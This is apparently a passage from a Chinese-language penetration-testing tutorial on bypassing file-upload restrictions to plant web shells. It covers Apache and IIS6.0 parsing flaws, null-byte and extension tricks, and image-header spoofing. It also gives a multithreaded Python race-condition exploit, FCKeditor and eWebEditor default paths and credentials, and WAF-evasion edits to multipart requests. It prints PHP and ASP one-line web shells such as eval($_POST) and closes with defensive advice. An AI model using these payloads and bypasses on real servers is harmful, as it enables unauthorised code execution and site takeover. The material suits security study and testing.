<h6 id="Apache站上的解析缺陷绕过上传漏洞"><a href="#Apache站上的解析缺陷绕过上传漏洞" class="headerlink" title="Apache站上的解析缺陷绕过上传漏洞"></a>Apache站上的解析缺陷绕过上传漏洞</h6><p>Apache的解析漏洞主要特性为Apache是从后面开始检查后缀，按最后一个合法后缀执行，整个漏洞的关键就是Apache的合法后缀到底是哪些，不是合法后缀的都可以被利用，所以将木马的后缀进行修改为允许上传的类型后，即可成功绕过验证，最终拿到权限。</p>
<p>例如新建完要上传的一句话木马文件后命名为yijuhua.php，然后我们在文件后缀处添加上7z，就有可能绕过验证上传成功。也可以修改后缀名为cab、zip、bmp等，只要是允许的上传类型都可能被上传成功。最后通过菜刀类工具访问即可。</p>
<h6 id="IIS6-0站上的目录路径检测解析绕过上传漏洞"><a href="#IIS6-0站上的目录路径检测解析绕过上传漏洞" class="headerlink" title="IIS6.0站上的目录路径检测解析绕过上传漏洞"></a>IIS6.0站上的目录路径检测解析绕过上传漏洞</h6><p>当我们使用的服务器都是Windows2003，并且使用的服务为IIS6.0时，就可能存在如本节所描述的漏洞。</p>
<p>以asp为例，先准备好一句话木马文件，然后通过burpsuite进行抓包：</p>
<p><img src="https://images.seebug.org/content/images/2018/04/6dd812e6-eb1e-417b-96bd-d5f2e28b9aff.png-w331s" alt="img"></p>
<p>查看数据包：</p>
<p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 uploadimg/改为<code>uploadimg/1.asp/;</code>，<code>filename=&quot;yijuhua.asp&quot;</code>修改为<code>filename=&quot;yijuhua.asp/1.jpg&quot;</code>。如图：</p>
<p><img src="https://images.seebug.org/content/images/2018/04/5b991dc4-d954-4d9c-8c9f-78c664b46bb2.png-w331s" alt="img"></p>
<p>本例的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“yijuhua.asp/1.jpg”</code>，也同样会被IIS当作ASP文件来解析并执行。</p>
<p>首先我们请求<code>/yijuhua.asp/1.jpg</code>，服务器会从头部查找查找”.”号,获得.asp/1.jpg。然后查找”/“,如果有则内存截断，所以<code>/yijuhua.asp/1.jpg</code>会当做<code>/yijuhua.asp</code>进行解析。</p>
<p>上传成功后，通过response我们可以查看到得到的文件名信息为“1.asp;14127900008.asp”，那么就可以在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.asp;14127900008.asp”</code>，并通过菜刀类的工具进行访问了。</p>
<h6 id="IIS6-0站上的解析缺陷绕过上传漏洞"><a href="#IIS6-0站上的解析缺陷绕过上传漏洞" class="headerlink" title="IIS6.0站上的解析缺陷绕过上传漏洞"></a>IIS6.0站上的解析缺陷绕过上传漏洞</h6><p>此类方法与上面讲的目录解析有点类似，不同点在于是利用文件解析来达到绕过上传的目的。</p>
<p>以php为例，同样是准备好一句话木马文件后通过burpsuite进行抓包。</p>
<p>查看数据包：</p>
<p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 <code>uploadimg/</code> 改为 <code>uploadimg/1.php;</code> ，<code>filename=&quot;yijuhua.php&quot;</code>修改为<code>filename=&quot;yijuhua.jpg&quot;</code>。</p>
<p><img src="https://images.seebug.org/content/images/2018/04/e1c080a6-7aea-4e60-b007-20541c72db62.png-w331s" alt="img"></p>
<p>本例中的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“1.php;yijuhua.jpg”</code>，也同样会被IIS当作PHP文件来解析并执行</p>
<p>首先我们请求<code>/1.php;yijuhua.jpg</code>，然后服务器会从头部查找查找”.”号,获得<code>.php;yijuhua.jpg</code>。接着查找到”;”，有则内存截断，所以<code>/1.php;yijuhua.jpg</code>会当做/1.php进行解析。</p>
<p>最后类似上一节那样，通过response我们可以查看到得到的文件名信息为<code>“1.php;14127900008.php”</code>，在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.php;14127900008.php”</code>，并通过菜刀类的工具进行访问。</p>
<p>1.使用大小写绕过（针对对大小写不敏感的系统如windows），如：PhP</p>
<p>2.使用黑名单外的脚本类型，如：php5,asa 和 cer等(IIS默认支持解析.asp,.cdx, .asa,.cer等)</p>
<p>能被解析的文件扩展名列表：</p>
<pre><code>   jsp jspx jspf
   asp asa cer aspx</code></pre><p>3.配合操作系统文件命令规则</p>
<p>（1）上传不符合windows文件命名规则的文件名</p>
<pre><code>   　　test.asp.
   　　test.asp(空格)
   　　test.php:1.jpg
   　　test.php:: $DATA</code></pre><p>会被windows系统自动去掉不符合规则符号后面的内容。</p>
<p>（2）linux下后缀名大小写</p>
<p>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
<p>(3)借助系统特性突破扩展名验证，如：test.php_(在windows下,下划线是空格，保存文件时下划线被吃掉剩下test.php)</p>
<p>4.双扩展名之间使用00截断，绕过验证上传恶意代码</p>
<p>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p>
<pre><code>   　　test.php(0x00).jpg
   　　test.php%00.jpg
   　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</code></pre><p>5.超长文件名截断上传(windows 258byte | linux 4096byte)</p>
<h4 id="服务端检测文件内容"><a href="#服务端检测文件内容" class="headerlink" title="服务端检测文件内容"></a>服务端检测文件内容</h4><h5 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h5><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p>
<p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p>
<p>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</p>
<p>（2）然后再上传一个.php的文件，内容为<?php Include(“上传的txt文件路径”);?></p>
<p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#PHP    </span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">Include</span><span class="token punctuation">(</span><span class="token string">"上传的txt文件路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> 
<span class="token shell-comment comment">#ASP    </span>
<span class="token markup"><span class="token comment" spellcheck="true">&lt;!--#include file="上传的txt文件路径" --></span></span>
<span class="token shell-comment comment">#JSP    </span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">jsp:</span>inclde</span> <span class="token attr-name">page</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上传的txt文件路径<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>
<span class="token keyword">or</span>  
<span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">%</span>@<span class="token keyword">include</span> file<span class="token operator">=</span><span class="token string">"上传的txt文件路径"</span><span class="token operator">%</span><span class="token operator">></span></code></pre>
<p>详细参考：<a href="http://thief.one/2017/04/10/2/" target="_blank" rel="noopener">文件包含漏洞(绕过姿势)</a></p>
<h5 id="利用PHP特性（使用数组绕过）"><a href="#利用PHP特性（使用数组绕过）" class="headerlink" title="利用PHP特性（使用数组绕过）"></a>利用PHP特性（使用数组绕过）</h5><p><img src="https://images.seebug.org/content/images/2018/04/1bb9ff63-9b8c-415e-bc9a-69f843b97ee5.png-w331s" alt="img"></p>
<p>file_put_contents 这个函数的第二个参数 可以是数组</p>
<p>然后 如果代码里用正则匹配 bad word 的时候</p>
<p>对一个数组进行正则匹配没用</p>
<h4 id="服务端检测文件头"><a href="#服务端检测文件头" class="headerlink" title="服务端检测文件头"></a>服务端检测文件头</h4><h5 id="文件头简介"><a href="#文件头简介" class="headerlink" title="文件头简介"></a>文件头简介</h5><p>不同的图片文件都有不同文件头，如：</p>
<p>PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A</p>
<p>JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)</p>
<p>GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61</p>
<p>PHP使用getimagesize函数验证图片文件头</p>
<h5 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>绕过这个检测只需要在恶意脚本前加上允许上传文件的头标识就可以了</p>
<p>在木马内容基础上再加了一些文件信息，有点像下面的结构</p>
<pre class=" language-php"><code class="language-php">GIF89a
<span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
<h4 id="上传到服务端后验证"><a href="#上传到服务端后验证" class="headerlink" title="上传到服务端后验证"></a>上传到服务端后验证</h4><h5 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h5><p>演示代码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">,</span><span class="token string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span>
<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">"./"</span><span class="token punctuation">;</span>

<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"file upload success.file path is: "</span><span class="token punctuation">.</span><span class="token variable">$newfile</span><span class="token punctuation">.</span><span class="token string">"\n&lt;br />"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:upload the file type is not allowed，delete the file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./info.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?php @eval($_POST["drops"]) ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
<p>​    当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> threading

<span class="token keyword">class</span> <span class="token class-name">RaceCondition</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/upload/shell0.php"</span>
        self<span class="token punctuation">.</span>uploadUrl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/upload/copy.php"</span>

    <span class="token keyword">def</span> <span class="token function">_get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'try to call uploaded file...'</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]create file info.php success"</span><span class="token punctuation">)</span>
            os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">_upload</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file....."</span><span class="token punctuation">)</span>
        file <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"file"</span><span class="token punctuation">:</span>open<span class="token punctuation">(</span><span class="token string">"shell0.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>uploadUrl<span class="token punctuation">,</span> files<span class="token operator">=</span>file<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>_upload<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    threads <span class="token operator">=</span> <span class="token number">20</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>
        t <span class="token operator">=</span> RaceCondition<span class="token punctuation">(</span><span class="token punctuation">)</span>
        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>
        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>经过几次尝试后成功成功写入shell</p>
<p><img src="https://images.seebug.org/content/images/2018/04/e0906f72-9da9-403c-a942-ba3771a931e0.png-w331s" alt="img"></p>
<h4 id="针对各种CMS"><a href="#针对各种CMS" class="headerlink" title="针对各种CMS"></a>针对各种CMS</h4><p>比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</p>
<ul>
<li>PHPCMSv9.6.0任意文件上传</li>
</ul>
<h5 id="针对各种编辑器漏洞"><a href="#针对各种编辑器漏洞" class="headerlink" title="针对各种编辑器漏洞"></a>针对各种编辑器漏洞</h5><p>比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。</p>
<h5 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h5><p>常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。</p>
<h5 id="1-FCKeditor"><a href="#1-FCKeditor" class="headerlink" title="1 FCKeditor"></a>1 FCKeditor</h5><p>下面以FCKeditor(现名为CKEditor)为例：</p>
<pre><code>1、敏感信息暴漏
    * 查看版本信息
        /FCKeditor/editor/dialog/fck_about.html
    * 默认上传页面
        /FCKeditor/editor/filemanager/browser/default/browser.html
        /FCKeditor/editor/filemanager/browser/default/connectors/test.html
        /FCKeditor/editor/filemanager/upload/test.html
        /FCKeditor/editor/filemanager/connectors/test.html
        /FCKeditor/editor/filemanager/connectors/uploadtest.html
    * 其他敏感文件
        /FCKeditor/editor/filemanager/connectors/aspx/connector.html
        /FCKeditor/editor/filemanager/connectors/asp/connector.html
        /FCKeditor/editor/filemanager/connectors/php/connector.php
2、黑名单策略错误
    FCKeditor&lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名
3、任意文件上传漏洞
    FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行，
在form中的action=&quot;http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; 即可，然后上传</code></pre><h5 id="2-eWebEditor"><a href="#2-eWebEditor" class="headerlink" title="2 eWebEditor"></a>2 eWebEditor</h5><pre><code>1、默认后台
    2.80以前为：ewebeditor/admin_login.asp
    2.80以后为：admin/login.asp
2、默认账号密码
    admin   admin888
3、数据库地址
    默认数据库地址
    ewebeditor/db/ewebeditor.mdb
    常用数据库地址
    ewebeditor/db/ewebeditor.asa
    ewebeditor/db/ewebeditor.asa
    ewebeditor/db/#ewebeditor.asa
    ewebeditor/db/#ewebeditor.mdb
    ewebeditor/db/!@#ewebeditor.asp
    ewebeditor/db/ewebeditor1033.mdb
    asp asa为后缀的数据库下载下来后改为mdb</code></pre><h4 id="针对各种WAF"><a href="#针对各种WAF" class="headerlink" title="针对各种WAF"></a>针对各种WAF</h4><h5 id="1-垃圾数据"><a href="#1-垃圾数据" class="headerlink" title="1 垃圾数据"></a>1 垃圾数据</h5><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p>
<p><img src="https://images.seebug.org/content/images/2018/04/a7ae783e-9275-4e41-9c70-c899396fb012.png-w331s" alt="img"></p>
<p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p>
<p><img src="https://images.seebug.org/content/images/2018/04/cd2f1355-be07-4c63-a802-0aa991bf2197.png-w331s" alt="img"></p>
<p>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>
<h5 id="2-filename"><a href="#2-filename" class="headerlink" title="2 filename"></a>2 filename</h5><p>针对早期版本安全狗，可以多加一个filename</p>
<p><img src="https://images.seebug.org/content/images/2018/04/0bd2ce6f-25e0-4f59-b004-957ff71b1fd9.png-w331s" alt="img"></p>
<p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：</p>
<p><img src="https://images.seebug.org/content/images/2018/04/d86eaa81-9a84-40dc-9347-6c5bfdbfeaf6.png-w331s" alt="img"></p>
<h5 id="3-POST-GET"><a href="#3-POST-GET" class="headerlink" title="3 POST/GET"></a>3 POST/GET</h5><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。 此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
<h5 id="4-以上方式"><a href="#4-以上方式" class="headerlink" title="4 以上方式"></a>4 以上方式</h5><p>针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。</p>
<p>**</p>
<h5 id="5-利用waf本身缺陷"><a href="#5-利用waf本身缺陷" class="headerlink" title="5 利用waf本身缺陷"></a>5 利用waf本身缺陷</h5><h6 id="删除实体里面的Conten-Type字段"><a href="#删除实体里面的Conten-Type字段" class="headerlink" title="删除实体里面的Conten-Type字段"></a>删除实体里面的Conten-Type字段</h6><p><img src="https://images.seebug.org/content/images/2018/04/f7b360e4-e055-43b7-ae94-b98419256476.png-w331s" alt="img"></p>
<p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p>
<pre class=" language-html"><code class="language-html">正常包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png
构造包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png
C.php"</code></pre>
<h6 id="删除Content-Disposition字段里的空格"><a href="#删除Content-Disposition字段里的空格" class="headerlink" title="删除Content-Disposition字段里的空格"></a>删除Content-Disposition字段里的空格</h6><p><img src="https://images.seebug.org/content/images/2018/04/1ca10020-3739-4def-b0e1-f4b004a1f196.png-w331s" alt="img"></p>
<p>增加一个空格导致安全狗被绕过案列： Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099 尝试在boundary后面加个空格或者其他可被正常处理的字符： boundary= —————————47146314211411730218525550</p>
<h6 id="修改Content-Disposition字段值的大小写"><a href="#修改Content-Disposition字段值的大小写" class="headerlink" title="修改Content-Disposition字段值的大小写"></a>修改Content-Disposition字段值的大小写</h6><p><img src="https://images.seebug.org/content/images/2018/04/ae0437ec-b9f5-48db-a28f-75408445c23f.png-w331s" alt="img"></p>
<h6 id="Boundary边界不一致"><a href="#Boundary边界不一致" class="headerlink" title="Boundary边界不一致"></a>Boundary边界不一致</h6><p>每次文件上传时的Boundary边界都是一致的：</p>
<pre><code>Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099
Content-Length: 253
-----------------------------4714631421141173021852555099
Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;
Content-Type: application/octet-stream

&lt;%eval request(&quot;a&quot;)%&gt;
-----------------------------4714631421141173021852555099--</code></pre><p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨： Win2k3 + IIS6.0 + ASP</p>
<p><img src="https://images.seebug.org/content/images/2018/04/c4f02267-e336-41c1-9423-3c86fa81856b.png-w331s" alt="img"></p>
<h6 id="文件名处回车"><a href="#文件名处回车" class="headerlink" title="文件名处回车"></a>文件名处回车</h6><p><img src="https://images.seebug.org/content/images/2018/04/80c9d74a-d9bc-411c-af2a-a704eb5e1aff.png-w331s" alt="img"></p>
<h6 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h6><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP</p>
<p><img src="https://images.seebug.org/content/images/2018/04/6b945737-c4b4-4350-a5ba-972b35b09fda.png-w331s" alt="img"></p>
<h5 id="利用NTFS-ADS特性"><a href="#利用NTFS-ADS特性" class="headerlink" title="利用NTFS ADS特性"></a>利用NTFS ADS特性</h5><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</p>
<p><img src="https://images.seebug.org/content/images/2018/04/b3625731-9f1d-4889-8609-b357b61a2368.png-w331s" alt="img"></p>
<h5 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h5><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。</p>
<p><img src="https://images.seebug.org/content/images/2018/04/95eabfd7-54b0-4f0f-971f-2316423fac33.png-w331s" alt="img"></p>
<h5 id="特殊的长文件名绕过"><a href="#特殊的长文件名绕过" class="headerlink" title="特殊的长文件名绕过"></a>特殊的长文件名绕过</h5><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：</p>
<p>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p>
<h5 id="反删除"><a href="#反删除" class="headerlink" title="反删除"></a>反删除</h5><p>将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）</p>
<p><img src="https://images.seebug.org/content/images/2018/04/389b0352-5ba1-4d7c-8d77-198dab060856.png-w331s" alt="img"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><pre class=" language-html"><code class="language-html">条件： 寻找一个上传点，查看上传点是否可用。

利用：

首先判断是程序员自己写的上传点，还是编辑器的上传功能

如果是编辑器上传功能，goolge当前编辑器的漏洞

如果是程序员写的上传点

上传一个正常的jpg图片 查看上传点是否可用

上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）

上传一个正常的jpg图片，burp拦截， 00截断 1.php%00.jpg

判断服务器是什么类型，web服务器程序，是什么类型，版本号多少

利用解析漏洞</code></pre>
<h4 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h4><ol>
<li>使用白名单限制可以上传的文件扩展（白名单比黑名单可靠多了）</li>
<li>验证文件内容，使用正则匹配恶意代码限制上传</li>
<li>对上传后的文件统一随机命名，不允许用户控制扩展名</li>
<li>修复服务器可能存在的解析漏洞</li>
<li>严格限制可以修改服务器配置的文件上传如：.htaccess</li>
<li>隐藏上传文件路径。</li>
<li>升级Web Server</li>
<li>及时修复Web上传代码（重要）</li>
<li>不能有本地文件包含漏洞</li>
<li>注意0x00截断攻击（PHP更新到最新版本）</li>
<li>上传文件的存储目录禁用执行权限</li>
</ol>
<h3 id="文件上传漏洞的主要利用和绕过方式总结。"><a href="#文件上传漏洞的主要利用和绕过方式总结。" class="headerlink" title="文件上传漏洞的主要利用和绕过方式总结。"></a>文件上传漏洞的主要利用和绕过方式总结。</h3><p><strong>1.前端JS绕过</strong></p>
<p>基于本地验证文件是否符合要求：直接将<strong>JavaScript</strong>禁用。或者burp抓包后修改后缀，将php文件后缀现先改为jpg，burp抓包后后缀改回php。</p>
<p><strong>2.MIME 类型验证</strong></p>
<p>burp抓包将<strong>Content-type</strong>类型修改为image/jpeg，image/png等</p>
<p><strong>3.黑名单验证</strong></p>
<p>1.寻找没有过滤的类型：phtml php3 php4 php5  PHP phtml</p>
<p>2.大小写绕过：例如Php</p>
<p><strong>4.文件内容验证</strong></p>
<p>1<strong>.getimagesize()函数获取图像信息</strong>：通过构造图片马进行绕过。</p>
<p>2.<strong>文件头绕过</strong>：例如 GIF89a <?php phpinfo(); ?></p>
<p>2.<strong>检验关键字</strong>&lt;?php:利用script标签绕过：<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;hack&#39;]);&lt;/script&gt;</code></p>
<p><strong>6. .htaccess上传</strong></p>
<p>上传的.jpg文件都会以php格式解析</p>
<p>.htaccess内容</p>
